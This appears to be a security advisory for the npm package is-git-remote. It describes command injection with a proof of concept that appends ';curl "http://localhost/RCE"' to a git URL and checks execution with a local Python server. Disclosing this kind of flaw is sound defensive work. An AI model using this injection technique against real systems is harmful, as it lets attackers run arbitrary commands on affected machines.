The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check.

## Proof of Concept (Credit: [Mik317](https://huntr.dev/app/users/Mik317))

1. Create the following PoC file:
```js
// poc.js
const isGitRemote = require('is-git-remote');
isGitRemote.default('https://github.com/Mik317/PyScan.git;curl "http://localhost/RCE"');
```
2. Run a `py` server in order to verify the `cUrl` command: `python3 -m http.server 80`
3. Execute the following commands in another terminal:
```bash
npm i is-git-remote # Install affected module
git init # Avoid problems with the file validation
node poc.js #  Run the PoC
```
4. The `cUrl` command will be executed ... and the `py` server will receive a request to the `http://localhost/RCE` address
## References:
 - [GitHub Issue](https://github.com/aichbauer/node-is-git-remote/issues/1)
 - [GitHub Permalink #1](https://github.com/aichbauer/node-is-git-remote/blob/master/lib/index.js#L15)